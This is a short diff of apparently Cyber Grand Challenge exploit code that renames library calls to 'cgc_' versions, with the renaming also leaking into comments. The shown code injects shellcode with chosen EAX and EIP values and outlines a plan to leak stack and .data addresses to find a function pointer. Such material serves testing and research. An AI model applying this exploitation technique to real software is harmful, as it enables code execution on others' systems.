@@ -27,7 +27,7 @@
  * Reliably recv bytes.
  *
  * @param fd File descriptor where we will recv bytes.
- * @param buf Pointer to where we will write the bytes
+ * @param buf Pointer to where we will cgc_write the bytes
  * @param size The amount of bytes to recv.
  * @return An int indicating SUCCESS (0) or an error condition (!=0).
  */
@@ -389,7 +389,7 @@ int doit(type1_vals *t1vals) {
     dbg("t_sc = 0x%08x\n", t_sc);
 
     // Read in shellcode, inject negotiated values for EAX and EIP.
-    memcpy(sc_buf, &sc_type1, SZ_SC);
+    cgc_memcpy(sc_buf, &sc_type1, SZ_SC);
     sc_buf[OFF_EAX+0] = (t1vals->regval >>  0) & 0xFF;
     sc_buf[OFF_EAX+1] = (t1vals->regval >>  8) & 0xFF;
     sc_buf[OFF_EAX+2] = (t1vals->regval >> 16) & 0xFF;
@@ -409,10 +409,10 @@ int doit(type1_vals *t1vals) {
     // Solution: there's a pointer to the .data section on the stack (and the 
     // stack does not move around).
     // Strategy:
-    // - read the stack, look for magic bookends on pointer to .data
+    // - cgc_read the stack, look for magic bookends on pointer to .data
     // - discover the base address of .data
     CHK_SUCCESS(find_data(), "unable to determine .data address\n");
-    // - read .data, look for magic bookends on func_ptr
+    // - cgc_read .data, look for magic bookends on func_ptr
     // - discover location of func_ptr
     CHK_SUCCESS(find_func_ptr(), "unable to locate func_ptr in .data\n");
 
